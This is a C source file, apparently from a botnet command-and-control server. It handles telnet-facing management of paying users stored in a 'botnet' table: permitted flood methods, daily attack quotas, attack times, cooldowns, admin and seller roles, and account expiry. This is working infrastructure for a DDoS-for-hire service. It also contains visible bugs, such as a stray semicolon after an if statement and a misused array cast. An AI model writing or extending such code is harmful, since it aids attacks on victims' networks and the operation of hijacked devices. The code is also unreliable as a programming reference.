#include <sqlite3.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <math.h>

#include "db.h"
#include "util.h"
#include "client.h"
#include "attack.h"

sqlite3 *conn = NULL;

void database_open(void) {

	int rc = sqlite3_open("database.db", &conn);

	if (rc != SQLITE_OK) {
		puts("Cannot open database");
		exit(1);
	}
}

void client_delete_fields(client_t *client) {

	if (client->floods) {
		for (int i = 0; i < client->flood_count; i++) {

            if (client->floods[i]);
                free(client->floods[i]);
		}

		free(client->floods);
	}
}

void client_list_users(client_t *client) {
    sqlite3_stmt *res;

    char *sql_query = "SELECT username, password, expiry FROM botnet ORDER BY expiry desc";

    int rc = sqlite3_prepare_v2(conn, sql_query, -1, &res, 0);

    if (rc != SQLITE_OK) {
        sqlite3_finalize(res);
        return;
    }

    while (TRUE) {

        int step = sqlite3_step(res);

        if (step != SQLITE_ROW) break;

        const char *username = sqlite3_column_text(res, 0);
        const char *password = sqlite3_column_text(res, 1);

        const time_t expiry = sqlite3_column_int(res, 2);

        if (!expiry) {
            util_sockprintf(client->fd, "Username: '%s', Expired: Never\r\n",
                username, password);
        }
        else {
            util_sockprintf(client->fd, "Username: '%s', Expired: %s, Expiry hours: %ldh\r\n",
                username, expiry > time(0) ? "False" : "True", ((expiry - time(0)) / 3600));
        }
    };

    sqlite3_finalize(res);

}

/* yes this is cancer, do I care, no */
BOOL client_delete_user(client_t *client) {
    char username[20] = {0};

    util_sockprintf(client->fd, "Username: ");
    telnet_wait_for(client, username, sizeof(username) - 1, FALSE);
    util_strip(username);

    client_log_user_event(client, DELETEUSER_EVENT, username);

    return sql_delete_user(username);
}

BOOL client_renew_hour(client_t *client) {
    char username[20] = {0}, expiry_hours[100] = {0};

    util_sockprintf(client->fd, "Username: ");
    telnet_wait_for(client, username, sizeof(username) - 1, FALSE);
    util_strip(username);

    util_sockprintf(client->fd, "Expiry Days: ");
    telnet_wait_for(client, expiry_hours, sizeof(expiry_hours) - 1, FALSE);
    util_strip(expiry_hours);

    if (!util_isdigit(expiry_hours)) {
        util_sockprintf(client->fd, "Value '%s' is incorrect as expiry before hours\n", expiry_hours);
        return FALSE;
    }

    int expiryhours = atoi(expiry_hours);

    client_log_user_event(client, RENEWUSER_EVENT, username);

    return sql_renew_hour(username, expiryhours);
}

/* yes this is cancer, do I care, no */
BOOL client_renew_user(client_t *client) {
    char username[20] = {0}, expiry_days[100] = {0};

    util_sockprintf(client->fd, "Username: ");
    telnet_wait_for(client, username, sizeof(username) - 1, FALSE);
    util_strip(username);

    util_sockprintf(client->fd, "Expiry Days: ");
    telnet_wait_for(client, expiry_days, sizeof(expiry_days) - 1, FALSE);
    util_strip(expiry_days);

    if (!util_isdigit(expiry_days)) {
        util_sockprintf(client->fd, "Value '%s' is incorrect as expiry before days\n", expiry_days);
        return FALSE;
    }

    int expirydays = atoi(expiry_days);

    client_log_user_event(client, RENEWUSER_EVENT, username);

    return sql_renew_user(username, expirydays);
}

BOOL client_add_user_flood(client_t *client) {
    char username[20] = {0}, flood[20] = {0};

    util_sockprintf(client->fd, "Username: ");
    telnet_wait_for(client, username, sizeof(username) - 1, FALSE);
    util_strip(username);

    util_sockprintf(client->fd, "Flood: ");
    telnet_wait_for(client, flood, sizeof(flood) - 1, FALSE);
    util_strip(flood);

    if (!attack_get_method(flood)) {
        util_sockprintf(client->fd, "'%s' is an invalid flood.\n", flood);
        return FALSE;
    }

    char floods[128] = {0};
    sql_get_text_val(username, "floods", (const char **)&floods);

    snprintf(floods + strlen(floods), sizeof(floods) - strlen(floods), ",%s", flood);

    return sql_mod_floods(username, floods);    
}

BOOL client_mod_daily_attacks(client_t *client) {
    char username[20] = {0}, daily_attacks[8] = {0};

    util_sockprintf(client->fd, "Username: ");
    telnet_wait_for(client, username, sizeof(username) - 1, FALSE);
    util_strip(username);

    util_sockprintf(client->fd, "Daily Attacks (100): ");
    telnet_wait_for(client, daily_attacks, sizeof(daily_attacks) - 1, FALSE);
    util_strip(daily_attacks);

    if (!util_isdigit(daily_attacks)) {
        util_sockprintf(client->fd, "Value '%s' is incorrect as daily attacks\n", daily_attacks);
        return FALSE;
    }

    int dailyattacks = atoi(daily_attacks);

    return sql_mod_daily_attacks(username, dailyattacks);    
}

/* yes this is cancer, do I care, no */
BOOL client_add_user(client_t *client) {
    char username[20] = {0}, password[128] = {0}, daily_attacks[8] = {0}, attack_time[8] = {0}, cooldown[8] = {0}, seller[7] = {0}, admin[7] = {0}, expiry_days[8] = {0};

    util_sockprintf(client->fd, "Username: ");
    telnet_wait_for(client, username, sizeof(username) - 1, FALSE);
    util_strip(username);

    util_sockprintf(client->fd, "Password: ");
    telnet_wait_for(client, password, sizeof(password) - 1, FALSE);
    util_strip(password);

    util_sockprintf(client->fd, "Daily Attacks (100): ");
    telnet_wait_for(client, daily_attacks, sizeof(daily_attacks) - 1, FALSE);
    util_strip(daily_attacks);

    util_sockprintf(client->fd, "Attack time (60): ");
    telnet_wait_for(client, attack_time, sizeof(attack_time) - 1, FALSE);
    util_strip(attack_time);

    util_sockprintf(client->fd, "Cooldown (60): ");
    telnet_wait_for(client, cooldown, sizeof(cooldown) - 1, FALSE);
    util_strip(cooldown);

    util_sockprintf(client->fd, "Admin (false): ");
    telnet_wait_for(client, admin, sizeof(admin) - 1, FALSE);
    util_strip(admin);

    util_sockprintf(client->fd, "Seller (false): ");
    telnet_wait_for(client, seller, sizeof(seller) - 1, FALSE);
    util_strip(seller);

    util_sockprintf(client->fd, "Days before expiry (1): ");
    telnet_wait_for(client, expiry_days, sizeof(expiry_days) - 1, FALSE);
    util_strip(expiry_days);

    if (!util_isdigit(daily_attacks)) {
        util_sockprintf(client->fd, "Value '%s' is incorrect as daily attacks\n", daily_attacks);
        return FALSE;
    }

    if (!util_isdigit(attack_time)) {
        util_sockprintf(client->fd, "Value '%s' is incorrect as attack time\n", attack_time);
        return FALSE;
    }

    if (!util_isdigit(cooldown)) {
        util_sockprintf(client->fd, "Value '%s' is incorrect as cooldown\n", cooldown);
        return FALSE;
    }

    if (!util_isdigit(expiry_days)) {
        util_sockprintf(client->fd, "Value '%s' is incorrect as expiry before days\n", expiry_days);
        return FALSE;
    }

    if (strcmp(admin, "true") && strcmp(admin, "false")) {
        util_sockprintf(client->fd, "Value '%s' is incorrect as admin\r\n", admin);
        return FALSE;   
    }

    if (strcmp(seller, "true") && strcmp(seller, "false")) {
        util_sockprintf(client->fd, "Value '%s' is incorrect as seller\r\n", seller);
        return FALSE;   
    }

    if (!strcmp(admin, "true") && !client->admin) {
        util_sockprintf(client->fd, "You are not able to create admin accounts.\r\n");
        return FALSE;
    }

    int dailyattacks = atoi(daily_attacks);
    int attacktime = atoi(attack_time);
    int cooldown_val = atoi(cooldown);
    int expirydays = atoi(expiry_days);

    client_log_user_event(client, ADDUSER_EVENT, username);

    return sql_insert_user(username, password, admin, seller, attacktime, cooldown_val, dailyattacks, expirydays);
}

BOOL client_reset_daily_attacks(void) {
    sqlite3_stmt *res;

	int rc = sqlite3_prepare_v2(conn, sql_get_users, -1, &res, 0);

    if (rc != SQLITE_OK) {
        sqlite3_finalize(res);
    	return FALSE;
    }

    while (TRUE) {
	    int step = sqlite3_step(res);

	    if (step != SQLITE_ROW) {
            sqlite3_finalize(res);
	    	return TRUE;
	    }

	    char *username = (char *)sqlite3_column_text(res, 1);

		int daily_attacks = sql_get_int_val(username, "daily_attacks");
		sql_set_int_val(username, "daily_attacks_left", daily_attacks);
    }

    sqlite3_finalize(res);

    return FALSE;
}

/* looks like weird logic but sets time ahead */
BOOL client_set_cooldown_timer(client_t *client, uint32_t attack_duration) {
	sql_set_int_val(client->username, "cooldown_timer", time(0) + attack_duration);
}

BOOL client_check_daily_attacks(client_t *client) {
    int attacks_left = sql_get_int_val(client->username, "daily_attacks_left");

    if (attacks_left <= 0) {
    	return FALSE;
    }

    attacks_left--;

    /* update attacks left */
    sql_set_int_val(client->username, "daily_attacks_left", attacks_left);
    return TRUE;
}

BOOL client_is_expired(client_t *client) {
    time_t expiry = sql_get_int_val(client->username, "expiry");

    if (!expiry)
        return FALSE;

    return !(expiry > time(0));
}

BOOL client_on_cooldown(client_t *client) {
	uint32_t cooldown_timer = sql_get_int_val(client->username, "cooldown_timer");

    /* just if bypass lol */
    if (cooldown_timer == -1)
        return TRUE;

	return !(time(0) >= cooldown_timer + client->cooldown);
}

BOOL client_update_fields(client_t *client) {
    sqlite3_stmt *res;

    /* clear fields first */
    client_delete_fields(client);

	int rc = sqlite3_prepare_v2(conn, sql_get_fields, -1, &res, 0);

    if (rc != SQLITE_OK) {
        sqlite3_finalize(res);
    	return FALSE;
    }

    /* bind the arguments */

    sqlite3_bind_text(res, 1, client->username, strlen(client->username), SQLITE_STATIC);

    int step = sqlite3_step(res);

    if (step != SQLITE_ROW) {
        sqlite3_finalize(res);
    	return FALSE;
    }

    client->admin = sqlite3_column_int(res, 0);
    client->seller = sqlite3_column_int(res, 1);
    client->flood_count = util_split(sqlite3_column_text(res, 2), ',', &client->floods);

    client->attacktime = sqlite3_column_int(res, 3);
    client->cooldown = sqlite3_column_int(res, 4);
    client->bots = sqlite3_column_int(res, 5);

    sqlite3_finalize(res);

    return TRUE;
}

BOOL client_check_login(client_t *client) {
    sqlite3_stmt *res;

	int rc = sqlite3_prepare_v2(conn, sql_get_user, -1, &res, 0);
    
    if (rc != SQLITE_OK) {
        sqlite3_finalize(res);
    	return FALSE;
    }

    /* bind the arguments */
    sqlite3_bind_text(res, 1, client->username, strlen(client->username), SQLITE_STATIC);

    int step = sqlite3_step(res);

    if (step != SQLITE_ROW) {
        sqlite3_finalize(res);
    	return FALSE;
    }

    BOOL ret = !strcmp(client->username, sqlite3_column_text(res, 0)) && !strcmp(client->password, sqlite3_column_text(res, 1));

    sqlite3_finalize(res);

    return ret;
}
